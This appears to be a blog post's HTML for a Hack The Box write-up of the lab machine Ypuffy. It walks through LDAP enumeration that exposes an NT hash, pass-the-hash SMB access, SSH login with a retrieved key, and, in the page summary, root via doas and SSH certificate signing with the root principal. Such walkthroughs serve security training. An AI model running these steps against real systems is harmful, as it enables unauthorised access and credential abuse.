<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Ypuffy - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Ypuffy from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Ypuffy">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/ypuffy/">


  <meta property="og:description" content="My write-up / walkthrough for Ypuffy from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Ypuffy">
  <meta name="twitter:description" content="My write-up / walkthrough for Ypuffy from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/ypuffy/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-02-09T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/ypuffy/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Ypuffy">
    <meta itemprop="description" content="Hack The Box - YpuffyQuick SummaryHey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in /etc/hosts as ypuffy.htbNmapAs always we will start with nmap so :nmap -sV -sT -sC ypuffy.htbNmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389It also tells us that we can connect anonymously to ldap.Initial EnumerationLet’s check http first Connection reset. http will be useful later but not now.Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use smbmapsmbmap -H ypuffy.htbAccess Denied.Let’s check ldapLDAPnmap told us that anonymous authentication was allowed so we will use a tool called ldapsearchldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htbFull Output :# extended LDIF## LDAPv3# base &lt;dc=hackthebox,dc=htb&gt; with scope subtree# filter: (objectclass=*)# requesting: ALL## hackthebox.htbdn: dc=hackthebox,dc=htbdc: hacktheboxobjectClass: topobjectClass: domain# passwd, hackthebox.htbdn: ou=passwd,dc=hackthebox,dc=htbou: passwdobjectClass: topobjectClass: organizationalUnit# bob8791, passwd, hackthebox.htbdn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htbuid: bob8791cn: BobobjectClass: accountobjectClass: posixAccountobjectClass: topuserPassword:: e0JTREFVVEh9Ym9iODc5MQ==uidNumber: 5001gidNumber: 5001gecos: BobhomeDirectory: /home/bob8791loginShell: /bin/ksh# alice1978, passwd, hackthebox.htbdn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htbuid: alice1978cn: AliceobjectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: sambaSamAccountuserPassword:: e0JTREFVVEh9YWxpY2UxOTc4uidNumber: 5000gidNumber: 5000gecos: AlicehomeDirectory: /home/alice1978loginShell: /bin/kshsambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001displayName: AlicesambaAcctFlags: [U          ]sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8BsambaPwdLastSet: 1532916644# group, hackthebox.htbdn: ou=group,dc=hackthebox,dc=htbou: groupobjectClass: topobjectClass: organizationalUnit# bob8791, group, hackthebox.htbdn: cn=bob8791,ou=group,dc=hackthebox,dc=htbobjectClass: posixGroupobjectClass: topcn: bob8791userPassword:: e2NyeXB0fSo=gidNumber: 5001# alice1978, group, hackthebox.htbdn: cn=alice1978,ou=group,dc=hackthebox,dc=htbobjectClass: posixGroupobjectClass: topcn: alice1978userPassword:: e2NyeXB0fSo=gidNumber: 5000# ypuffy, hackthebox.htbdn: sambadomainname=ypuffy,dc=hackthebox,dc=htbsambaDomainName: YPUFFYsambaSID: S-1-5-21-3933741069-3307154301-3557023464sambaAlgorithmicRidBase: 1000objectclass: sambaDomainsambaNextUserRid: 1000sambaMinPwdLength: 5sambaPwdHistoryLength: 0sambaLogonToChgPwd: 0sambaMaxPwdAge: -1sambaMinPwdAge: 0sambaLockoutDuration: 30sambaLockoutObservationWindow: 30sambaLockoutThreshold: 0sambaForceLogoff: -1sambaRefuseMachinePwdChange: 0sambaNextRid: 1001# search resultsearch: 2result: 0 Success# numResponses: 9# numEntries: 8we can also use nmap to enumerate ldap , with a script called ldap-searchnmap -p 389 --script ldap-search ypuffy.htbFull Output:Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EETNmap scan report for ypuffy.htb (10.10.10.107)Host is up (0.14s latency).PORT    STATE SERVICE389/tcp open  ldap| ldap-search: |   Context: dc=hackthebox,dc=htb|     dn: dc=hackthebox,dc=htb|         dc: hackthebox|         objectClass: top|         objectClass: domain|     dn: ou=passwd,dc=hackthebox,dc=htb|         ou: passwd|         objectClass: top|         objectClass: organizationalUnit|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb|         uid: bob8791|         cn: Bob|         objectClass: account|         objectClass: posixAccount|         objectClass: top|         userPassword: {BSDAUTH}bob8791|         uidNumber: 5001|         gidNumber: 5001|         gecos: Bob|         homeDirectory: /home/bob8791|         loginShell: /bin/ksh|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb|         uid: alice1978|         cn: Alice|         objectClass: account|         objectClass: posixAccount|         objectClass: top|         objectClass: sambaSamAccount|         userPassword: {BSDAUTH}alice1978|         uidNumber: 5000|         gidNumber: 5000|         gecos: Alice|         homeDirectory: /home/alice1978|         loginShell: /bin/ksh|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001|         displayName: Alice|         sambaAcctFlags: [U          ]|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B|         sambaPwdLastSet: 1532916644|     dn: ou=group,dc=hackthebox,dc=htb|         ou: group|         objectClass: top|         objectClass: organizationalUnit|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb|         objectClass: posixGroup|         objectClass: top|         cn: bob8791|         userPassword: {crypt}*|         gidNumber: 5001|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb|         objectClass: posixGroup|         objectClass: top|         cn: alice1978|         userPassword: {crypt}*|         gidNumber: 5000|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb|         sambaDomainName: YPUFFY|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464|         sambaAlgorithmicRidBase: 1000|         objectclass: sambaDomain|         sambaNextUserRid: 1000|         sambaMinPwdLength: 5|         sambaPwdHistoryLength: 0|         sambaLogonToChgPwd: 0|         sambaMaxPwdAge: -1|         sambaMinPwdAge: 0|         sambaLockoutDuration: 30|         sambaLockoutObservationWindow: 30|         sambaLockoutThreshold: 0|         sambaForceLogoff: -1|         sambaRefuseMachinePwdChange: 0|_        sambaNextRid: 1001Nmap done: 1 IP address (1 host up) scanned in 2.17 secondsThe most interesting part is this :We get a username alice1978 and an smb NT hash 0B186E661BBDBDCF6047784DE8B9FD8BThis hash is uncrackable however we can still use it to authenticate.SMB EnumerationWe need to list the shares first to know where we can connect. We can use a tool called crackmapexec :crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --sharesThere are only two shares alice and IPC$ , we have read and write permissions to alice and no access to IPC$We can also use smbclient to list the shares :smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/But it doesn’t tell us which shares do we have access to and which we don’t.So we know that we can access the share alice , let’s connect.smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/aliceThere’s only one file called my_private_key.ppk , get my_private_key.ppk to download it.SSH and getting usermy_private_key.ppk is a putty private key , we need to convert that to an ssh private key to be able to ssh with it.On kali I had to get putty-tools first apt-get install putty-toolsThen we will use puttygen :puttygen my_private_key.ppk -O private-openssh -o alice.keyNow let’s take a look at the key :Last step is to chmod 600 alice.key and finally sshssh -i alice.key alice1978@ypuffy.htbAnd we owned user !More EnumerationRemember http ? we got a connection reset. Let’s check /etc/httpd.confWe see two interesting things , location &quot;/userca*&quot; and location &quot;/sshauth*&quot;After some more enumeration , there are 3 users on the box alice1978 , bob8791 and usercabob8791 has a directory called dbaInside it there’s an sql file called sshauth.sqlIt creates a table called principals and another table called keysIf we also check sshd_config in /etc/ssh/#	$OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $# This is the sshd server system-wide configuration file.  See# sshd_config(5) for more information.# The strategy used for options in the default sshd_config shipped with# OpenSSH is to specify options with their default value where# possible, but leave them commented.  Uncommented options override the# default value.#Port 22#AddressFamily any#ListenAddress 0.0.0.0#ListenAddress ::#HostKey /etc/ssh/ssh_host_rsa_key#HostKey /etc/ssh/ssh_host_ecdsa_key#HostKey /etc/ssh/ssh_host_ed25519_key# Ciphers and keying#RekeyLimit default none# Logging#SyslogFacility AUTH#LogLevel INFO# Authentication:#LoginGraceTime 2mPermitRootLogin prohibit-password#StrictModes yes#MaxAuthTries 6#MaxSessions 10#PubkeyAuthentication yes# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2# but this is overridden so installations will only check .ssh/authorized_keysAuthorizedKeysFile	.ssh/authorized_keys#AuthorizedPrincipalsFile noneAuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%uAuthorizedKeysCommandUser nobodyTrustedUserCAKeys /home/userca/ca.pubAuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%uAuthorizedPrincipalsCommandUser nobody# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts#HostbasedAuthentication no# Change to yes if you don't trust ~/.ssh/known_hosts for# HostbasedAuthentication#IgnoreUserKnownHosts no# Don't read the user's ~/.rhosts and ~/.shosts files#IgnoreRhosts yes# To disable tunneled clear text passwords, change to no here!PasswordAuthentication no#PermitEmptyPasswords no# Change to no to disable s/key passwordsChallengeResponseAuthentication noAllowAgentForwarding noAllowTcpForwarding no#GatewayPorts noX11Forwarding no#X11DisplayOffset 10#X11UseLocalhost yes#PermitTTY yes#PrintMotd yes#PrintLastLog yes#TCPKeepAlive yes#UseLogin no#PermitUserEnvironment no#Compression delayed#ClientAliveInterval 0#ClientAliveCountMax 3#UseDNS no#PidFile /var/run/sshd.pid#MaxStartups 10:30:100#PermitTunnel no#ChrootDirectory none#VersionAddendum none# no default banner path#Banner none# override default of no subsystemsSubsystem	sftp	/usr/libexec/sftp-server# Example of overriding settings on a per-user basis#Match User anoncvs#	X11Forwarding no#	AllowTcpForwarding no#	PermitTTY no#	ForceCommand cvs serverThis part :So that http service is responsible for some ssh authentication stuff , and we can request keys from /sshauth?type=keys&amp;username= and principals from /sshauth?type=principals&amp;username= , requesting keys for root gives us no response , but requesting the principal we get 3m3rgencyB4ckd00rGenerating and signing ssh keys , Getting rootSo now we have root’s principal 3m3rgencyB4ckd00r. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them.The problem is , as alice1978 we are not authorized to do this. On linux we could check if we can run elevated commands with sudo -l but here there’s no sudo , instead of that there’s a command called doas , if we check the config file for it :We can run ssh-keygen as userca without password.First step is to create ssh keys for alice1978 ssh-keygen -t rsa -f /tmp/id_rsaThen we need the certificate (ca) in /home/userca/ so we will cd there And sign the ssh keys we have just created as rootdoas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsadoas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub-s for certificate , -I for identity and -n for principalFinally we will ssh as root :ssh -i /tmp/id_rsa root@localhostAnd we owned root !That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - DabNext Hack The Box write-up : Hack The Box - Giddy">
    <meta itemprop="datePublished" content="2019-02-09T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/ypuffy/" class="u-url" itemprop="url">Hack The Box - Ypuffy
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-02-09T07:00:00+02:00">February 9, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          7 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---ypuffy">Hack The Box - Ypuffy</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#initial-enumeration">Initial Enumeration</a></li>
<li><a href="#ldap">LDAP</a></li>
<li><a href="#smb-enumeration">SMB Enumeration</a></li>
<li><a href="#ssh-and-getting-user">SSH and getting user</a></li>
<li><a href="#more-enumeration">More Enumeration</a></li>
<li><a href="#generating-and-signing-ssh-keys--getting-root">Generating and signing ssh keys , Getting root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---ypuffy">Hack The Box - Ypuffy</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">ypuffy.htb</code>
<br><img src="/images/hackthebox/ypuffy/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with nmap so :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC ypuffy.htb</code>
<br><img src="/images/hackthebox/ypuffy/1.png" alt="" class="align-center"><br><br>
Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389
It also tells us that we can connect anonymously to ldap.<br></p>

<h2 id="initial-enumeration">Initial Enumeration</h2>
<p>Let’s check http first 
<br><img src="/images/hackthebox/ypuffy/2.png" alt="" class="align-center"><br><br>
Connection reset. http will be useful later but not now.<br>
Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use <code class="language-plaintext highlighter-rouge">smbmap</code>
<code class="language-plaintext highlighter-rouge">smbmap -H ypuffy.htb</code>
<br><img src="/images/hackthebox/ypuffy/3.png" alt="" class="align-center"><br><br>
Access Denied.<br>
Let’s check ldap</p>

<h2 id="ldap">LDAP</h2>
<p>nmap told us that anonymous authentication was allowed so we will use a tool called <code class="language-plaintext highlighter-rouge">ldapsearch</code>
<br><code class="language-plaintext highlighter-rouge">ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb</code>
<br>Full Output :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># extended LDIF
#
# LDAPv3
# base &lt;dc=hackthebox,dc=htb&gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# hackthebox.htb
dn: dc=hackthebox,dc=htb
dc: hackthebox
objectClass: top
objectClass: domain

# passwd, hackthebox.htb
dn: ou=passwd,dc=hackthebox,dc=htb
ou: passwd
objectClass: top
objectClass: organizationalUnit

# bob8791, passwd, hackthebox.htb
dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
uid: bob8791
cn: Bob
objectClass: account
objectClass: posixAccount
objectClass: top
userPassword:: e0JTREFVVEh9Ym9iODc5MQ==
uidNumber: 5001
gidNumber: 5001
gecos: Bob
homeDirectory: /home/bob8791
loginShell: /bin/ksh

# alice1978, passwd, hackthebox.htb
dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
uid: alice1978
cn: Alice
objectClass: account
objectClass: posixAccount
objectClass: top
objectClass: sambaSamAccount
userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
uidNumber: 5000
gidNumber: 5000
gecos: Alice
homeDirectory: /home/alice1978
loginShell: /bin/ksh
sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
displayName: Alice
sambaAcctFlags: [U          ]
sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
sambaPwdLastSet: 1532916644

# group, hackthebox.htb
dn: ou=group,dc=hackthebox,dc=htb
ou: group
objectClass: top
objectClass: organizationalUnit

# bob8791, group, hackthebox.htb
dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
objectClass: posixGroup
objectClass: top
cn: bob8791
userPassword:: e2NyeXB0fSo=
gidNumber: 5001

# alice1978, group, hackthebox.htb
dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
objectClass: posixGroup
objectClass: top
cn: alice1978
userPassword:: e2NyeXB0fSo=
gidNumber: 5000

# ypuffy, hackthebox.htb
dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
sambaDomainName: YPUFFY
sambaSID: S-1-5-21-3933741069-3307154301-3557023464
sambaAlgorithmicRidBase: 1000
objectclass: sambaDomain
sambaNextUserRid: 1000
sambaMinPwdLength: 5
sambaPwdHistoryLength: 0
sambaLogonToChgPwd: 0
sambaMaxPwdAge: -1
sambaMinPwdAge: 0
sambaLockoutDuration: 30
sambaLockoutObservationWindow: 30
sambaLockoutThreshold: 0
sambaForceLogoff: -1
sambaRefuseMachinePwdChange: 0
sambaNextRid: 1001

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 8
</code></pre></div></div>
<p>we can also use nmap to enumerate ldap , with a script called <code class="language-plaintext highlighter-rouge">ldap-search</code>
<br><code class="language-plaintext highlighter-rouge">nmap -p 389 --script ldap-search ypuffy.htb</code>
<br>Full Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET
Nmap scan report for ypuffy.htb (10.10.10.107)
Host is up (0.14s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: dc=hackthebox,dc=htb
|     dn: dc=hackthebox,dc=htb
|         dc: hackthebox
|         objectClass: top
|         objectClass: domain
|     dn: ou=passwd,dc=hackthebox,dc=htb
|         ou: passwd
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
|         uid: bob8791
|         cn: Bob
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         userPassword: {BSDAUTH}bob8791
|         uidNumber: 5001
|         gidNumber: 5001
|         gecos: Bob
|         homeDirectory: /home/bob8791
|         loginShell: /bin/ksh
|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
|         uid: alice1978
|         cn: Alice
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: sambaSamAccount
|         userPassword: {BSDAUTH}alice1978
|         uidNumber: 5000
|         gidNumber: 5000
|         gecos: Alice
|         homeDirectory: /home/alice1978
|         loginShell: /bin/ksh
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
|         displayName: Alice
|         sambaAcctFlags: [U          ]
|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
|         sambaPwdLastSet: 1532916644
|     dn: ou=group,dc=hackthebox,dc=htb
|         ou: group
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: bob8791
|         userPassword: {crypt}*
|         gidNumber: 5001
|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: alice1978
|         userPassword: {crypt}*
|         gidNumber: 5000
|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
|         sambaDomainName: YPUFFY
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
|         sambaAlgorithmicRidBase: 1000
|         objectclass: sambaDomain
|         sambaNextUserRid: 1000
|         sambaMinPwdLength: 5
|         sambaPwdHistoryLength: 0
|         sambaLogonToChgPwd: 0
|         sambaMaxPwdAge: -1
|         sambaMinPwdAge: 0
|         sambaLockoutDuration: 30
|         sambaLockoutObservationWindow: 30
|         sambaLockoutThreshold: 0
|         sambaForceLogoff: -1
|         sambaRefuseMachinePwdChange: 0
|_        sambaNextRid: 1001

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
</code></pre></div></div>
<p>The most interesting part is this :
<br><img src="/images/hackthebox/ypuffy/4.png" alt="" class="align-center"><br><br>
We get a username <code class="language-plaintext highlighter-rouge">alice1978</code> and an smb NT hash <code class="language-plaintext highlighter-rouge">0B186E661BBDBDCF6047784DE8B9FD8B</code>
This hash is uncrackable however we can still use it to authenticate.<br></p>

<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>We need to list the shares first to know where we can connect. We can use a tool called <code class="language-plaintext highlighter-rouge">crackmapexec</code> :
<code class="language-plaintext highlighter-rouge">crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares</code>
<br><img src="/images/hackthebox/ypuffy/5.png" alt="" class="align-center"><br><br>
There are only two shares <code class="language-plaintext highlighter-rouge">alice</code> and <code class="language-plaintext highlighter-rouge">IPC$</code> , we have read and write permissions to <code class="language-plaintext highlighter-rouge">alice</code> and no access to <code class="language-plaintext highlighter-rouge">IPC$</code>
We can also use smbclient to list the shares :
<code class="language-plaintext highlighter-rouge">smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/</code>
<br><img src="/images/hackthebox/ypuffy/6.png" alt="" class="align-center"><br><br>
But it doesn’t tell us which shares do we have access to and which we don’t.<br>
So we know that we can access the share <code class="language-plaintext highlighter-rouge">alice</code> , let’s connect.<br>
<code class="language-plaintext highlighter-rouge">smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice</code>
<br><img src="/images/hackthebox/ypuffy/7.png" alt="" class="align-center"><br><br>
There’s only one file called <code class="language-plaintext highlighter-rouge">my_private_key.ppk</code> , <code class="language-plaintext highlighter-rouge">get my_private_key.ppk</code> to download it.<br></p>

<h2 id="ssh-and-getting-user">SSH and getting user</h2>
<p><code class="language-plaintext highlighter-rouge">my_private_key.ppk</code> is a putty private key , we need to convert that to an ssh private key to be able to ssh with it.<br>
On kali I had to get <code class="language-plaintext highlighter-rouge">putty-tools</code> first 
<code class="language-plaintext highlighter-rouge">apt-get install putty-tools</code>
Then we will use <code class="language-plaintext highlighter-rouge">puttygen</code> :
<code class="language-plaintext highlighter-rouge">puttygen my_private_key.ppk -O private-openssh -o alice.key</code>
Now let’s take a look at the key :
<br><img src="/images/hackthebox/ypuffy/8.png" alt="" class="align-center"><br><br>
Last step is to <code class="language-plaintext highlighter-rouge">chmod 600 alice.key</code> and finally ssh
<code class="language-plaintext highlighter-rouge">ssh -i alice.key alice1978@ypuffy.htb</code>
<br><img src="/images/hackthebox/ypuffy/9.png" alt="" class="align-center"><br><br>
And we owned user !</p>

<h2 id="more-enumeration">More Enumeration</h2>
<p>Remember http ? we got a connection reset. Let’s check <code class="language-plaintext highlighter-rouge">/etc/httpd.conf</code>
<br><img src="/images/hackthebox/ypuffy/10.png" alt="" class="align-center"><br><br>
We see two interesting things , <code class="language-plaintext highlighter-rouge">location "/userca*"</code> and <code class="language-plaintext highlighter-rouge">location "/sshauth*"</code>
After some more enumeration , there are 3 users on the box 
<br><img src="/images/hackthebox/ypuffy/11.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">alice1978</code> , <code class="language-plaintext highlighter-rouge">bob8791</code> and <code class="language-plaintext highlighter-rouge">userca</code>
bob8791 has a directory called <code class="language-plaintext highlighter-rouge">dba</code>
<br><img src="/images/hackthebox/ypuffy/12.png" alt="" class="align-center"><br><br>
Inside it there’s an sql file called <code class="language-plaintext highlighter-rouge">sshauth.sql</code>
<br><img src="/images/hackthebox/ypuffy/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ypuffy/14.png" alt="" class="align-center"><br><br>
It creates a table called <code class="language-plaintext highlighter-rouge">principals</code> and another table called <code class="language-plaintext highlighter-rouge">keys</code>
